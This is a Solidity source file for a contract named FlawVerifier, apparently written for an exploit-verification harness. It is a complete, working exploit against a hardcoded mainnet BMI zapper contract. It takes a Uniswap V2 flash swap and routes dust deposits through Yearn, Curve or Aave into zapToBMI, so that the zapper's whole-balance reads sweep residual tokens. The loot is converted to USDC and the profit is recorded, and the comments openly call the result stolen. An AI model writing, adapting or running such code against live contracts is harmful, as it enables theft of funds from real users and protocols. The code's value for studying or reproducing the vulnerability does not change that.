// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IYearn {
    function pricePerShare() external view returns (uint256);
    function token() external view returns (address);
    function deposit() external returns (uint256);
    function deposit(uint256 amount) external returns (uint256);
    function withdraw() external returns (uint256);
    function withdraw(uint256 maxShares) external returns (uint256);
}

interface ICurvePool {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface ICurveZapSimple {
    function add_liquidity(uint256[4] calldata amounts, uint256 minMintAmount) external;
    function add_liquidity(uint256[3] calldata amounts, uint256 minMintAmount) external;
    function add_liquidity(uint256[3] calldata amounts, uint256 minMintAmount, bool useUnderlying) external;
    function add_liquidity(address pool, uint256[4] calldata amounts, uint256 minMintAmount) external;

    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount, bool donateDust) external;
    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount) external;
    function remove_liquidity_one_coin(address pool, uint256 tokenAmount, int128 i, uint256 minAmount, address receiver) external;
}

interface IAaveLendingPoolV2 {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBasket {
    function mint(uint256 amount) external;
    function getOne() external view returns (address[] memory, uint256[] memory);
    function getAssetsAndBalances() external view returns (address[] memory, uint256[] memory);
}

interface IBMIZapper {
    function BMI() external view returns (address);
    function calcUSDCEquilavent(address _from, uint256 _amount) external view returns (uint256);

    function zapToBMI(
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] calldata _bmiConstituents,
        uint256[] calldata _bmiConstituentsWeightings,
        address _aggregator,
        bytes calldata _aggregatorData,
        bool refundDust
    ) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0x4622aFF8E521A444C9301dA0efD05f6b482221b8;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address internal constant USDP = 0x1456688345527bE1f37E9e627DA0837D6f08C925;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant ALUSD = 0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9;
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant USDN = 0x674C6Ad92Fd080e4004b2312b45f796a192D27a0;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant yDAI = 0x19D3364A399d251E894aC732651be8B0E4e85001;
    address internal constant yUSDC = 0x5f18C75AbDAe578b483E5F43f12a39cF75b973a9;
    address internal constant yUSDT = 0x7Da96a3891Add058AdA2E826306D812C638D87a7;
    address internal constant yTUSD = 0x37d19d1c4E1fa9DC47bD1eA12f742a0887eDa74a;
    address internal constant ySUSD = 0xa5cA62D95D24A4a350983D5B8ac4EB8638887396;

    address internal constant yCRV = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address internal constant ycrvSUSD = 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A;
    address internal constant ycrvYBUSD = 0x8ee57c05741aA9DB947A744E713C15d4d19D8822;
    address internal constant ycrvBUSD = 0x6Ede7F19df5df6EF23bD5B9CeDb651580Bdf56Ca;
    address internal constant ycrvUSDP = 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417;
    address internal constant ycrvFRAX = 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139;
    address internal constant ycrvALUSD = 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8;
    address internal constant ycrvLUSD = 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6;
    address internal constant ycrvUSDN = 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa;
    address internal constant ycrvIB = 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7;
    address internal constant ycrvThree = 0x84E13785B5a27879921D6F685f041421C7F482dA;
    address internal constant ycrvDUSD = 0x30FCf7c6cDfC46eC237783D94Fc78553E79d4E9C;
    address internal constant ycrvMUSD = 0x8cc94ccd0f3841a468184aCA3Cc478D2148E1757;
    address internal constant ycrvUST = 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44;

    address internal constant aDAI = 0x028171bCA77440897B824Ca71D1c56caC55b68A3;
    address internal constant aUSDC = 0xBcca60bB61934080951369a648Fb03DF4F96263C;
    address internal constant aUSDT = 0x3Ed3B47Dd13EC9a98b44e6204A523E766B225811;
    address internal constant aTUSD = 0x101cc05f4A51C0319f570d5E146a8C625198e636;
    address internal constant aSUSD = 0x6C5024Cd4F8A59110119C56f8933403A539555EB;

    address internal constant crvY = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    address internal constant crvSUSD = 0xC25a3A3b969415c80451098fa907EC722572917F;
    address internal constant crvYBUSD = 0x3B3Ac5386837Dc563660FB6a0937DFAa5924333B;
    address internal constant crvBUSD = 0x4807862AA8b2bF68830e4C8dc86D0e9A998e085a;
    address internal constant crvUSDP = 0x7Eb40E450b9655f4B3cC4259BCC731c63ff55ae6;
    address internal constant crvFRAX = 0xd632f22692FaC7611d2AA1C0D552930D43CAEd3B;
    address internal constant crvALUSD = 0x43b4FdFD4Ff969587185cDB6f0BD875c5Fc83f8c;
    address internal constant crvLUSD = 0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA;
    address internal constant crvUSDN = 0x4f3E8F405CF5aFC05D68142F3783bDfE13811522;
    address internal constant crvIB = 0x5282a4eF67D9C33135340fB3289cc1711c13638C;
    address internal constant crvThree = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant crvDUSD = 0x3a664Ab939FD8482048609f652f9a0B0677337B9;
    address internal constant crvMUSD = 0x1AEf73d49Dedc4b1778d0706583995958Dc862e6;
    address internal constant crvUST = 0x94e131324b6054c0D789b190b2dAC504e4361b53;

    address internal constant crvSUSDPool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address internal constant crvYZap = 0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
    address internal constant crvSUSDZap = 0xFCBa3E75865d2d561BE8D220616520c171F12851;
    address internal constant crvYBUSDZap = 0xb6c057591E073249F2D9D88Ba59a46CFC9B59EdB;
    address internal constant crvUSDPZap = 0x3c8cAee4E09296800f8D29A68Fa3837e2dae4940;
    address internal constant crvDUSDZap = 0x61E10659fe3aa93d036d099405224E4Ac24996d0;
    address internal constant crvUSTZap = 0xB0a0716841F2Fc03fbA72A891B8Bb13584F52F2d;
    address internal constant crvUSDNZap = 0x094d12e5b541784701FD8d65F11fc0598FBC6332;
    address internal constant crvIBPool = 0x2dded6Da1BF5DBdF597C45fcFaa3194e53EcfeAF;
    address internal constant crvThreePool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address internal constant crvMUSDZap = 0x803A2B40c5a9BB2B86DD630B274Fa2A9202874C2;
    address internal constant crvMetaZapper = 0xA79828DF1850E8a3A3064576f380D90aECDD3359;

    address internal constant AAVE_LENDING_POOL_V2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address internal constant UNISWAP_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24AE83637ab66a2cca9C378B9F;

    uint8 private constant ROUTE_NONE = 0;
    uint8 private constant ROUTE_YEARN_PRIMITIVE = 1;
    uint8 private constant ROUTE_YEARN_CRV = 2;
    uint8 private constant ROUTE_AAVE = 3;
    uint8 private constant ROUTE_PRIMITIVE = 4;

    // The bug only needs a real dust input. A tiny public flash swap is enough,
    // and the stolen BMI is liquidated on public AMMs to settle that funding leg.
    uint256 internal constant FLASH_BORROW_USDC = 5e6;
    uint256 internal constant DUST_INPUT_USDC = 1e6;

    IBMIZapper internal constant ZAPPER = IBMIZapper(TARGET);

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address bmi = ZAPPER.BMI();
        uint256 startUSDC = _balanceOf(USDC, address(this));
        uint256 startBMI = _balanceOf(bmi, address(this));

        (address[] memory constituents, uint256[] memory weightings) = _buildWeightings(bmi);
        if (constituents.length == 0 || constituents.length != weightings.length) {
            _setProfit(startUSDC, startBMI, bmi);
            return;
        }

        (uint8 routeType, address routeToken) = _selectOpportunity(constituents);
        if (routeType == ROUTE_NONE) {
            _setProfit(startUSDC, startBMI, bmi);
            return;
        }

        bool usdcIsToken0 = IUniswapV2Pair(UNISWAP_V2_USDC_WETH).token0() == USDC;
        IUniswapV2Pair(UNISWAP_V2_USDC_WETH).swap(
            usdcIsToken0 ? FLASH_BORROW_USDC : 0,
            usdcIsToken0 ? 0 : FLASH_BORROW_USDC,
            address(this),
            abi.encode(routeType, routeToken, constituents, weightings)
        );

        _setProfit(startUSDC, startBMI, bmi);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == UNISWAP_V2_USDC_WETH, "pair");
        require(sender == address(this), "sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 amountRequired = ((borrowed * 1000) / 997) + 1;
        (uint8 routeType, address routeToken, address[] memory constituents, uint256[] memory weightings) =
            abi.decode(data, (uint8, address, address[], uint256[]));

        if (routeType == ROUTE_YEARN_PRIMITIVE) {
            _executeYearnPrimitive(routeToken, constituents, weightings);
        } else if (routeType == ROUTE_YEARN_CRV) {
            _executeYearnCrv(routeToken, constituents, weightings);
        } else if (routeType == ROUTE_AAVE) {
            _executeAave(routeToken, constituents, weightings);
        } else if (routeType == ROUTE_PRIMITIVE) {
            _executePrimitive(routeToken, constituents, weightings);
        }

        _swapAllTokenToUSDC(ZAPPER.BMI());
        _swapAllTokenToUSDC(DAI);
        _swapAllTokenToUSDC(USDT);

        _safeTransfer(USDC, UNISWAP_V2_USDC_WETH, amountRequired);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectOpportunity(address[] memory constituents) internal view returns (uint8 routeType, address routeToken) {
        address[3] memory yearnPrimitive;
        yearnPrimitive[0] = yUSDC;
        yearnPrimitive[1] = yDAI;
        yearnPrimitive[2] = yUSDT;
        for (uint256 i = 0; i < yearnPrimitive.length; ++i) {
            if (_balanceOf(yearnPrimitive[i], TARGET) > 0) {
                return (ROUTE_YEARN_PRIMITIVE, yearnPrimitive[i]);
            }
        }

        address[14] memory yearnCrv;
        yearnCrv[0] = yCRV;
        yearnCrv[1] = ycrvSUSD;
        yearnCrv[2] = ycrvYBUSD;
        yearnCrv[3] = ycrvBUSD;
        yearnCrv[4] = ycrvUSDP;
        yearnCrv[5] = ycrvFRAX;
        yearnCrv[6] = ycrvALUSD;
        yearnCrv[7] = ycrvLUSD;
        yearnCrv[8] = ycrvUSDN;
        yearnCrv[9] = ycrvIB;
        yearnCrv[10] = ycrvThree;
        yearnCrv[11] = ycrvDUSD;
        yearnCrv[12] = ycrvMUSD;
        yearnCrv[13] = ycrvUST;
        for (uint256 i = 0; i < yearnCrv.length; ++i) {
            address vault = yearnCrv[i];
            if (_balanceOf(vault, TARGET) > 0) {
                return (ROUTE_YEARN_CRV, vault);
            }
            address crvToken = _yearnCrvUnderlying(vault);
            if (crvToken != address(0) && _balanceOf(crvToken, TARGET) > 0) {
                return (ROUTE_YEARN_CRV, vault);
            }
        }

        address[3] memory aave;
        aave[0] = aUSDC;
        aave[1] = aDAI;
        aave[2] = aUSDT;
        for (uint256 i = 0; i < aave.length; ++i) {
            if (_balanceOf(aave[i], TARGET) > 0) {
                return (ROUTE_AAVE, aave[i]);
            }
        }

        if (_balanceOf(USDC, TARGET) > 0 || _hasAnyConstituentResidual(constituents)) {
            return (ROUTE_PRIMITIVE, USDC);
        }
        if (_balanceOf(DAI, TARGET) > 0) {
            return (ROUTE_PRIMITIVE, DAI);
        }
        if (_balanceOf(USDT, TARGET) > 0) {
            return (ROUTE_PRIMITIVE, USDT);
        }

        return (ROUTE_NONE, address(0));
    }

    function _executeYearnPrimitive(address vault, address[] memory constituents, uint256[] memory weightings) internal {
        address underlying = _yearnUnderlying(vault);
        uint256 dustAmount = _prepareDustToken(underlying);

        uint256 preShares = _balanceOf(vault, address(this));
        _forceApprove(underlying, vault, dustAmount);
        IYearn(vault).deposit(dustAmount);

        uint256 mintedShares = _balanceOf(vault, address(this)) - preShares;
        require(mintedShares > 0, "no-shares");

        _forceApprove(vault, TARGET, mintedShares);
        bool ok = _callZap(vault, mintedShares, underlying, dustAmount, constituents, weightings);
        require(ok, "yearn-zap");
    }

    function _executeYearnCrv(address vault, address[] memory constituents, uint256[] memory weightings) internal {
        uint256 preShares = _balanceOf(vault, address(this));
        uint256 dustUsed = _mintYearnCrvDust(vault, DUST_INPUT_USDC);
        require(dustUsed > 0, "no-crv-dust");

        uint256 mintedShares = _balanceOf(vault, address(this)) - preShares;
        require(mintedShares > 0, "no-crv-shares");

        _forceApprove(vault, TARGET, mintedShares);
        bool ok = _callZap(vault, mintedShares, USDC, DUST_INPUT_USDC, constituents, weightings);
        require(ok, "ycrv-zap");
    }

    function _executeAave(address aToken, address[] memory constituents, uint256[] memory weightings) internal {
        address underlying = _aaveUnderlying(aToken);
        uint256 dustAmount = _prepareDustToken(underlying);

        uint256 preAToken = _balanceOf(aToken, address(this));
        _forceApprove(underlying, AAVE_LENDING_POOL_V2, dustAmount);
        IAaveLendingPoolV2(AAVE_LENDING_POOL_V2).deposit(underlying, dustAmount, address(this), 0);

        uint256 mintedAToken = _balanceOf(aToken, address(this)) - preAToken;
        require(mintedAToken > 0, "no-atoken");

        _forceApprove(aToken, TARGET, mintedAToken);
        bool ok = _callZap(aToken, mintedAToken, underlying, dustAmount, constituents, weightings);
        require(ok, "aave-zap");
    }

    function _executePrimitive(address token, address[] memory constituents, uint256[] memory weightings) internal {
        uint256 dustAmount = _prepareDustToken(token);
        _forceApprove(token, TARGET, dustAmount);
        bool ok = _callZap(token, dustAmount, token, dustAmount, constituents, weightings);
        require(ok, "primitive-zap");
    }

    function _prepareDustToken(address token) internal returns (uint256 amount) {
        if (token == USDC) {
            return DUST_INPUT_USDC;
        }

        if (token == DAI || token == USDT) {
            // Only DAI/USDT are executable non-USDC primitive routes. The other
            // Yearn/Aave primitives are infeasible here because the target's
            // aggregator approval is capped to the caller-supplied dust amount,
            // so it would not sweep the whole residual underlying balance.
            amount = _swapUSDCForToken(token, DUST_INPUT_USDC);
            require(amount > 0, "swap-dust");
            return amount;
        }

        revert("unsupported-dust");
    }

    function _mintYearnCrvDust(address vault, uint256 usdcAmount) internal returns (uint256) {
        address crvToken = _yearnCrvUnderlying(vault);
        require(crvToken != address(0), "bad-vault");

        uint256 beforeCrv = _balanceOf(crvToken, address(this));
        uint256[4] memory amounts4;
        uint256[3] memory amounts3;

        if (
            vault == yCRV ||
            vault == ycrvSUSD ||
            vault == ycrvYBUSD ||
            vault == ycrvUSDN ||
            vault == ycrvUSDP ||
            vault == ycrvDUSD ||
            vault == ycrvMUSD ||
            vault == ycrvUST
        ) {
            address zap = crvYZap;
            uint256 usdcIndex = 1;

            if (vault == ycrvSUSD) {
                zap = crvSUSDZap;
            } else if (vault == ycrvYBUSD) {
                zap = crvYBUSDZap;
            } else if (vault == ycrvUSDN) {
                zap = crvUSDNZap;
                usdcIndex = 2;
            } else if (vault == ycrvUSDP) {
                zap = crvUSDPZap;
                usdcIndex = 2;
            } else if (vault == ycrvDUSD) {
                zap = crvDUSDZap;
                usdcIndex = 2;
            } else if (vault == ycrvMUSD) {
                zap = crvMUSDZap;
                usdcIndex = 2;
            } else if (vault == ycrvUST) {
                zap = crvUSTZap;
                usdcIndex = 2;
            }

            amounts4[usdcIndex] = usdcAmount;
            _forceApprove(USDC, zap, usdcAmount);
            ICurveZapSimple(zap).add_liquidity(amounts4, 0);
        } else if (vault == ycrvThree || vault == ycrvIB) {
            address zap = vault == ycrvIB ? crvIBPool : crvThreePool;
            amounts3[1] = usdcAmount;
            _forceApprove(USDC, zap, usdcAmount);

            if (vault == ycrvIB) {
                ICurveZapSimple(zap).add_liquidity(amounts3, 0, true);
            } else {
                ICurveZapSimple(zap).add_liquidity(amounts3, 0);
            }
        } else {
            amounts4[2] = usdcAmount;
            _forceApprove(USDC, crvMetaZapper, usdcAmount);
            ICurveZapSimple(crvMetaZapper).add_liquidity(crvToken, amounts4, 0);
        }

        uint256 mintedCrv = _balanceOf(crvToken, address(this)) - beforeCrv;
        require(mintedCrv > 0, "no-lp");

        _forceApprove(crvToken, vault, mintedCrv);
        IYearn(vault).deposit();
        return mintedCrv;
    }

    function _callZap(
        address from,
        uint256 amount,
        address fromUnderlying,
        uint256 fromUnderlyingAmount,
        address[] memory constituents,
        uint256[] memory weightings
    ) internal returns (bool ok) {
        // The exploit path is unchanged: a real dust caller reaches the same
        // whole-balance reads inside the zapper. The only extra steps are public
        // liquidity acquisition and post-exploit liquidation to settle funding.
        (ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IBMIZapper.zapToBMI.selector,
                from,
                amount,
                fromUnderlying,
                fromUnderlyingAmount,
                0,
                constituents,
                weightings,
                address(0),
                bytes(""),
                true
            )
        );
    }

    function _buildWeightings(address bmi) internal view returns (address[] memory assets, uint256[] memory weightings) {
        uint256[] memory one;

        try IBasket(bmi).getOne() returns (address[] memory _assets, uint256[] memory _one) {
            assets = _assets;
            one = _one;
        } catch {
            try IBasket(bmi).getAssetsAndBalances() returns (address[] memory _assets, uint256[] memory _balances) {
                assets = _assets;
                one = _balances;
            } catch {
                return (assets, weightings);
            }
        }

        if (assets.length == 0 || assets.length != one.length) {
            return (assets, weightings);
        }

        weightings = new uint256[](assets.length);
        uint256[] memory usdcQuotes = new uint256[](assets.length);
        uint256 totalQuote;

        for (uint256 i = 0; i < assets.length; ++i) {
            usdcQuotes[i] = _quoteUSDC(assets[i], one[i]);
            totalQuote += usdcQuotes[i];
        }

        if (totalQuote == 0) {
            uint256 equalWeight = 1e18 / assets.length;
            uint256 acc;
            for (uint256 i = 0; i + 1 < assets.length; ++i) {
                weightings[i] = equalWeight;
                acc += equalWeight;
            }
            weightings[assets.length - 1] = 1e18 - acc;
            return (assets, weightings);
        }

        uint256 sumWeights;
        for (uint256 i = 0; i + 1 < assets.length; ++i) {
            uint256 w = (usdcQuotes[i] * 1e18) / totalQuote;
            weightings[i] = w;
            sumWeights += w;
        }
        weightings[assets.length - 1] = 1e18 - sumWeights;
    }

    function _quoteUSDC(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) {
            return 0;
        }

        if (_isYearnPrimitive(asset)) {
            uint256 underlying = (amount * IYearn(asset).pricePerShare()) / 1e18;
            if (asset == ySUSD) {
                return ICurvePool(crvSUSDPool).get_dy(3, 1, underlying);
            }
            return _normalizeToUSDC(_yearnUnderlying(asset), underlying);
        }

        if (_isYearnCrv(asset)) {
            try ZAPPER.calcUSDCEquilavent(asset, amount) returns (uint256 quoted) {
                return quoted;
            } catch {
                return 0;
            }
        }

        return _normalizeToUSDC(asset, amount);
    }

    function _swapUSDCForToken(address tokenOut, uint256 amountIn) internal returns (uint256) {
        uint256 beforeBal = _balanceOf(tokenOut, address(this));
        bool ok = _trySwap(USDC, tokenOut, amountIn, UNISWAP_V2_ROUTER);
        if (!ok) {
            ok = _trySwap(USDC, tokenOut, amountIn, SUSHISWAP_ROUTER);
        }
        require(ok, "dust-route");
        return _balanceOf(tokenOut, address(this)) - beforeBal;
    }

    function _swapAllTokenToUSDC(address token) internal {
        if (token == USDC) {
            return;
        }

        uint256 bal = _balanceOf(token, address(this));
        if (bal == 0) {
            return;
        }

        if (_trySwap(token, USDC, bal, UNISWAP_V2_ROUTER)) {
            return;
        }
        if (_trySwap(token, USDC, _balanceOf(token, address(this)), SUSHISWAP_ROUTER)) {
            return;
        }
    }

    function _trySwap(address tokenIn, address tokenOut, uint256 amountIn, address router) internal returns (bool) {
        if (amountIn == 0) {
            return true;
        }

        _forceApprove(tokenIn, router, amountIn);

        address[] memory direct = new address[](2);
        direct[0] = tokenIn;
        direct[1] = tokenOut;

        (bool ok, ) = router.call(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapExactTokensForTokens.selector,
                amountIn,
                0,
                direct,
                address(this),
                block.timestamp
            )
        );
        if (ok) {
            return true;
        }

        address[] memory viaWeth = new address[](3);
        viaWeth[0] = tokenIn;
        viaWeth[1] = WETH;
        viaWeth[2] = tokenOut;

        (ok, ) = router.call(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapExactTokensForTokens.selector,
                amountIn,
                0,
                viaWeth,
                address(this),
                block.timestamp
            )
        );
        return ok;
    }

    function _yearnUnderlying(address vault) internal pure returns (address) {
        if (vault == yDAI) {
            return DAI;
        }
        if (vault == yUSDC) {
            return USDC;
        }
        if (vault == yUSDT) {
            return USDT;
        }
        if (vault == yTUSD) {
            return TUSD;
        }
        return SUSD;
    }

    function _aaveUnderlying(address aToken) internal pure returns (address) {
        if (aToken == aDAI) {
            return DAI;
        }
        if (aToken == aUSDC) {
            return USDC;
        }
        if (aToken == aUSDT) {
            return USDT;
        }
        if (aToken == aTUSD) {
            return TUSD;
        }
        return SUSD;
    }

    function _yearnCrvUnderlying(address vault) internal pure returns (address) {
        if (vault == yCRV) {
            return crvY;
        }
        if (vault == ycrvSUSD) {
            return crvSUSD;
        }
        if (vault == ycrvYBUSD) {
            return crvYBUSD;
        }
        if (vault == ycrvBUSD) {
            return crvBUSD;
        }
        if (vault == ycrvUSDP) {
            return crvUSDP;
        }
        if (vault == ycrvFRAX) {
            return crvFRAX;
        }
        if (vault == ycrvALUSD) {
            return crvALUSD;
        }
        if (vault == ycrvLUSD) {
            return crvLUSD;
        }
        if (vault == ycrvUSDN) {
            return crvUSDN;
        }
        if (vault == ycrvIB) {
            return crvIB;
        }
        if (vault == ycrvThree) {
            return crvThree;
        }
        if (vault == ycrvDUSD) {
            return crvDUSD;
        }
        if (vault == ycrvMUSD) {
            return crvMUSD;
        }
        if (vault == ycrvUST) {
            return crvUST;
        }
        return address(0);
    }

    function _normalizeToUSDC(address asset, uint256 amount) internal view returns (uint256) {
        uint8 decimals;
        try IERC20(asset).decimals() returns (uint8 d) {
            decimals = d;
        } catch {
            return 0;
        }

        if (decimals == 6) {
            return amount;
        }
        if (decimals > 6) {
            return amount / (10 ** (decimals - 6));
        }
        return amount * (10 ** (6 - decimals));
    }

    function _setProfit(uint256 startUSDC, uint256 startBMI, address bmi) internal {
        uint256 endUSDC = _balanceOf(USDC, address(this));
        if (endUSDC > startUSDC) {
            _profitToken = USDC;
            _profitAmount = endUSDC - startUSDC;
            return;
        }

        uint256 endBMI = _balanceOf(bmi, address(this));
        if (endBMI > startBMI) {
            _profitToken = bmi;
            _profitAmount = endBMI - startBMI;
        }
    }

    function _hasAnyConstituentResidual(address[] memory constituents) internal view returns (bool) {
        for (uint256 i = 0; i < constituents.length; ++i) {
            if (_balanceOf(constituents[i], TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20(token).balanceOf(account) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "token-call");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "token-false");
        }
    }

    function _isYearnPrimitive(address token) internal pure returns (bool) {
        return token == yDAI || token == yUSDC || token == yUSDT || token == yTUSD || token == ySUSD;
    }

    function _isYearnCrv(address token) internal pure returns (bool) {
        return token == yCRV ||
            token == ycrvSUSD ||
            token == ycrvYBUSD ||
            token == ycrvBUSD ||
            token == ycrvUSDP ||
            token == ycrvFRAX ||
            token == ycrvALUSD ||
            token == ycrvLUSD ||
            token == ycrvUSDN ||
            token == ycrvIB ||
            token == ycrvThree ||
            token == ycrvDUSD ||
            token == ycrvMUSD ||
            token == ycrvUST;
    }
}
